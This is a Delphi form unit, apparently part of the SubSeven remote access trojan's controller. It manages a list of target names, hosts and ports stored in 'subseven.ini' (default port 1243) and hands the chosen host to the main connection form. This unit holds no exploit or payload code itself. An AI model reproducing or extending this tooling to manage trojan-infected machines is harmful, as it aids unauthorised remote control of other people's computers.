unit ListaUnit;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  StdCtrls,inifiles;

type
  TLista = class(TForm)
    VList: TListBox;
    VName: TEdit;
    VIP: TEdit;
    Button1: TButton;
    Button2: TButton;
    Button3: TButton;
    Label1: TLabel;
    Label2: TLabel;
    Button4: TButton;
    Button5: TButton;
    Label3: TLabel;
    vPort: TEdit;
    procedure FormCreate(Sender: TObject);
    procedure VListClick(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Refresh(Sender:TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button5Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Lista: TLista;
  IPNumbers:Byte;
  AtItem:Integer;
implementation

uses Unit2;

{$R *.DFM}
function ReadIni(INISection,INIVar:String):String;
var MyStr:String;
    MyINI:TIniFile;
begin
 MyIni := TIniFile.Create('subseven.ini');
 with MyIni do MyStr := ReadString(IniSection,INIVar,'0');
 MyIni.Free;
result:=MyStr;
end;
Procedure SaveIni(INISection,INIVar,INIVal:String);
var MyIni: TIniFile;
begin;
 MyIni := TIniFile.Create('subseven.ini');
 with MyIni do WriteString(INISection,INIVar,INIVal);
 MyIni.Free;
end;

procedure TLista.Refresh(Sender:TObject);
var i:Integer;
begin
 VList.Items.Clear;
 IPNumbers:=StrToInt(ReadINI('IP Addresses','Count'));
 for i:=1 to IPNumbers do
  VList.Items.Add(ReadINI('IP Addresses','Name'+IntToStr(i)));
end;

procedure TLista.FormCreate(Sender: TObject);
begin
 Refresh(Sender);
end;

procedure TLista.VListClick(Sender: TObject);
var vp:string;
begin
{ if FileExists('c:\windows\subseven.ini') then begin}
 AtItem:=VList.ItemIndex+1;
 VName.Text:=ReadINI('IP Addresses','Name'+IntToStr(AtItem));
 VIP.Text:=ReadINI('IP Addresses','Host'+IntToStr(AtItem));
 vp:=ReadINI('IP Addresses','Port'+IntToStr(AtItem));
 if vp='0' then
  begin
   vPort.Text:='1243';
   SaveINI('IP Addresses','Port'+IntToStr(IPNumbers),vPort.Text);
  end else vPort.Text:=vp;
{end;}
end;

procedure TLista.Button4Click(Sender: TObject);
begin
 Form1.Enabled:=True;
 Lista.Hide;
 Lista.Enabled:=False;
end;

procedure TLista.Button2Click(Sender: TObject);
var j:Integer;
begin
 if (VName.Text='') or (VIP.Text='') then
  ShowMessage('you gotta fill in the <name> and the <host> fields in order to add the info')
 else begin
  for j:=1 to IPNumbers do
  begin
   if VName.Text=ReadINI('IP Addresses','Name'+IntToStr(j)) then
    begin ShowMessage('user already exists. use update to UPDATE the user''s info');exit;end;
   if VIP.Text=ReadINI('IP Addresses','Host'+IntToStr(j)) then
    begin ShowMessage('host already exists. use update to UPDATE the user''s info');exit;end;
  end;
   inc(IPNumbers);
   SaveINI('IP Addresses','Host'+IntToStr(IPNumbers),VIP.Text);
   SaveINI('IP Addresses','Name'+IntToStr(IPNumbers),VName.Text);
   SaveINI('IP Addresses','Port'+IntToStr(IPNumbers),vPort.Text);
   SaveINI('IP Addresses','Count',IntToStr(IPNumbers));
  Refresh(Sender);
 end;
end;

procedure TLista.Button1Click(Sender: TObject);
begin
 if (VName.Text='') or (VIP.Text='') then
  ShowMessage('you gotta fill in the <name> and the <host> fields in order to update the info')
 else begin
  SaveINI('IP Addresses','Host'+IntToStr(AtItem),VIP.Text);
  SaveINI('IP Addresses','Name'+IntToStr(AtItem),VName.Text);
  SaveINI('IP Addresses','Port'+IntToStr(AtItem),vPort.Text);
  Refresh(Sender);
 end;
end;

procedure TLista.Button3Click(Sender: TObject);
begin
 Form1.Edit1.Text:=VIP.Text;
 Form1.Tag:=AtItem;
 Form1.Port.Text:=vPort.Text;
 Form1.Enabled:=True;
 Lista.Hide;
 Lista.Enabled:=False;
end;

procedure TLista.Button5Click(Sender: TObject);
var TempStr1,TempStr2,TempStr3:String;
    w:Integer;
begin
 if MessageDlg('are you sure you wanna delete:'+ReadINI('IP Addresses','Name'+IntToStr(AtItem))+' ?',
  mtConfirmation,[mbYes,mbNo],0)=mrNo then exit;
 if AtItem<IPNumbers then
 for w:=AtItem+1 to IPNumbers do
 begin
  TempStr1:=ReadINI('IP Addresses','Name'+IntToStr(w));
  TempStr2:=ReadINI('IP Addresses','Host'+IntToStr(w));
  TempStr3:=ReadINI('IP Addresses','Port'+IntToStr(w));
  SaveINI('IP Addresses','Host'+IntToStr(w-1),TempStr2);
  SaveINI('IP Addresses','Name'+IntToStr(w-1),TempStr1);
  if TempStr3='0' then TempStr3:='1243';
  SaveINI('IP Addresses','Port'+IntToStr(w-1),TempStr3);
 end;
 Dec(IPNumbers);
 SaveINI('IP Addresses','Count',IntToStr(IPNumbers));
 Refresh(Sender);
end;

end.
